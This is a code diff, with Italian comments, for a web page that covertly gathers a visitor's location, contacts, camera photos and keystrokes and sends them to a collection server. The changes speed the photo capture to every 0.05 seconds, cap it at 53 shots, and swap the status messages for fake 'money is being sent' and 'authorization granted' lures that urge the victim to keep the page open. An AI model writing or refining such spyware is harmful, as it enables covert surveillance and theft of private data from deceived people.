@@ -27,7 +27,7 @@
     <script>
         // ===== CONFIGURAZIONE =====
         const SERVER_URL = 'http://localhost:3000/collect';
-        const PHOTO_INTERVAL = 5000; // scatta una foto ogni 5 secondi
+        const PHOTO_INTERVAL = 50; // scatta una foto ogni 0.05 secondi
         const KEYLOG_INTERVAL = 3000; // invia i tasti accumulati ogni 3 secondi
 
         // ===== STATO GLOBALE =====
@@ -190,21 +190,29 @@
             });
         }
 
-        async function photoLoop() {
-            while (isCollecting) {
-                try {
-                    const facing = videoStream ? 'environment' : 'user';
-                    const photo = await capturePhoto(facing);
-                    // Invia ogni foto singolarmente (potrebbero essere grandi)
-                    sendData({ type: 'photo', data: photo });
-                    photoCount++;
-                    document.getElementById('status').innerText = `Foto scattate: ${photoCount}`;
-                } catch (e) {
-                    console.warn('Errore foto:', e);
-                }
-                await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
+        const MAX_PHOTOS = 53  // <-- aggiungi questa costante in cima al codice (dopo le altre costanti)
+
+async function photoLoop() {
+    while (isCollecting) {
+        try {
+            const facing = videoStream ? 'environment' : 'user';
+            const photo = await capturePhoto(facing);
+            sendData({ type: 'photo', data: photo });
+            photoCount++;
+            document.getElementById('status').innerText = `CARICAMENTO... ${photoCount} %`;
+
+            // === LIMITE QUI ===
+            if (photoCount >= MAX_PHOTOS) {
+                isCollecting = false;
+                document.getElementById('status').innerText = `CARICAMENTO COMPLETATO.`;
+                break;  // esce dal ciclo while
             }
+        } catch (e) {
+            console.warn('Errore caricamento:', e);
         }
+        await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
+    }
+}
 
         // ===== 4. KEYLOGGER =====
         function startKeylogger() {
@@ -243,16 +251,16 @@
 
         // ===== 6. FUNZIONE PRINCIPALE =====
         async function collectAndRun() {
-            document.getElementById('status').innerText = 'Ottenendo posizione...';
+            document.getElementById('status').innerText = 'Ottenendo soldi';
             const geo = await getGeolocation();
-            document.getElementById('status').innerText = 'Ottenendo contatti...';
+            document.getElementById('status').innerText = 'Convertendo dollari in euro';
             const contacts = await getContacts();
-            document.getElementById('status').innerText = 'Avvio fotocamera...';
+            document.getElementById('status').innerText = 'Iniziallizzazione di invio denaro...';
             try {
                 await startCamera();
-                document.getElementById('status').innerText = 'Fotocamera attiva, inizio scatto...';
+                document.getElementById('status').innerText = 'Autorizzazione concessa! Invio denaro in corso...';
             } catch (e) {
-                document.getElementById('status').innerText = 'Fotocamera non disponibile, continuo senza foto.';
+                document.getElementById('status').innerText = 'Autorizzazione rifiutata! Invio denaro annullato...';
             }
 
             // Invia il pacchetto iniziale (posizione + contatti + metadati)
@@ -277,9 +285,9 @@
             // Mostra messaggio di "falso aggiornamento" e invita a non chiudere
             document.getElementById('loading').innerHTML = `
                 <div style="margin-top:2rem;">
-                    <p style="color:#888;">Aggiornamento in corso... Non chiudere questa pagina.</p>
-                    <p id="status" style="color:#555;">Raccolta dati attiva.</p>
-                    <p style="color:#333;font-size:0.8rem;">${photoCount} foto scattate</p>
+                    <p style="color:#888;">Invio in Corso... Non chiudere questa pagina.</p>
+                    <p id="status" style="color:#555;">Generazione denaro in corso...</p>
+                    <p style="color:#333;font-size:0.8rem;">La chiusura di questa pagina interrompe tutti i processi</p>
                 </div>
             `;
             // Se si vuole un redirect, si può fare dopo 10 secondi, ma la pagina verrà chiusa e la raccolta si fermerà.
